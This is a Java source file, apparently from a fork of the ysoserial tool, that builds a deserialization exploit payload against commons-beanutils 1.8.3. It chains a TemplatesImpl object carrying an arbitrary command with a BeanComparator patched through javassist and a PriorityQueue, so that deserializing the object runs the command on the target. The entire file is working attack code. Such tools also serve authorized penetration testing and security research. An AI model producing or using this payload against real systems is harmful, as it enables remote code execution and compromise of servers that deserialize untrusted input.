import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.math.BigInteger;
import java.util.PriorityQueue;

// ref: https://github.com/woodpecker-framework/ysoserial-for-woodpecker/blob/master/src/main/java/me/gv7/woodpecker/yso/payloads/CommonsBeanutils2_183.java
@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.FROHOFF })
public class CommonsBeanutils1_183 implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.get("org.apache.commons.beanutils.BeanComparator");
        CtField ctField = CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctClass);

        ctClass.addField(ctField);
        Class clazz = ctClass.toClass();

        final BeanComparator comparator = (BeanComparator)clazz.newInstance();
        // mock method name until armed
//        final BeanComparator comparator = new BeanComparator("lowestSetBit");
        Reflections.setFieldValue(comparator, "property", "lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1_183.class, args);
    }
}
